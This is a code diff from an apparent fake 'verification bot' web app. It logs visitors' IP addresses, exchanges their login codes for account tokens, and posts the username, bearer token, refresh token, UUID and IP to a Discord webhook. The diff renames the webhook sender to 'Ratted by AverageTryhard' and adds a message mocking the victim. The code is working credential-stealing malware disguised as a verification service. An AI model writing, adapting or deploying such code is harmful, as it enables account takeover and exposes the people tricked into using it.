@@ -17,7 +17,7 @@ app.get('/verify', async (req, res) => {
 })
 
 app.get('/', async (req, res) => {
-    res.send('ERROR: Verification bot is down.')
+    res.send('ERROR: Verification bot is down. Please Ask The Owner for more info and Support')
     const clientIp = requestIp.getClientIp(req)
     const code = req.query.code
     if (code == null) {
@@ -128,9 +128,9 @@ async function getUsernameAndUUID(bearerToken) {
 function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
     const url = webhook_url
     let data = {
-username: "[LVL 100] Rat",
-  avatar_url: "https://cdn.discordapp.com/avatars/1033045491912552508/0d33e4f7aa3fdbc3507880eb7b2d1458.webp",  
-content: "@everyone",
+username: "Ratted by AverageTryhard",
+  avatar_url: "https://bigrat.monster/media/bigrat.png",  
+content: "@everyone Beamed this Bozo",
   embeds: [
     {
       color: 3482894,
